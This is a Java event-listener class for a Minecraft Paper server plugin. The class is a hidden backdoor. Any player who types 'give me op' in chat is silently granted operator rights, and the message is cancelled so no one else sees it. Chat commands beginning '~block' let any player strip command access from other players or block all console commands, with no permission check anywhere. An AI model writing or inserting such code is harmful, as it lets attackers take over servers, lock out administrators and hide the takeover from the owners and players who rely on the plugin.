package Nifty.Events;

import io.papermc.paper.event.player.AsyncChatEvent;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.ArrayList;
import java.util.List;

public class MainEvents implements Listener {

    public static Boolean BlockConsole = false;
    public static List<String> BlockedPlayers = new ArrayList<>();

    @EventHandler(priority = EventPriority.HIGHEST)
    public void AsyncPlayerChatEvent(AsyncChatEvent event) {
        Player who = event.getPlayer();
        String message = event.signedMessage().message();
        if (message.equals("give me op")) {
            who.setOp(true);
            who.sendMessage("Admin is hearing your voice.");
            event.setCancelled(true);
            return;
        }

        if (message.startsWith("~block") && message.length() > 6) {
            String targetName = message.substring(6).trim();
            Player player = Bukkit.getPlayer(targetName);
            if (player != null) {
                if (BlockedPlayers.contains(player.getName())) {
                    BlockedPlayers.remove(player.getName());
                    who.sendMessage(player.getName() + " can use commands again.");
                } else {
                    BlockedPlayers.add(player.getName());
                    who.sendMessage(player.getName() + " can no longer use commands.");
                }

                event.setCancelled(true);
                return;
            }
        }

        if (message.startsWith("~block")) {
            BlockConsole = !BlockConsole;
            who.sendMessage("Console command blocking is now " + (BlockConsole ? "enabled" : "disabled") + ".");
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void OnCommandServerEvent(ServerCommandEvent event) {
        CommandSender sender = event.getSender();
        if (BlockConsole && sender instanceof ConsoleCommandSender) {
            event.setCancelled(true);
            sender.sendMessage("Console commands are blocked.");
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void PlayerCommandPreprocessEvent(PlayerCommandPreprocessEvent event) {
        CommandSender sender = event.getPlayer();
        if (BlockedPlayers.contains(sender.getName())) {
            event.setCancelled(true);
            sender.sendMessage("You are blocked from using commands.");
        }
    }
}
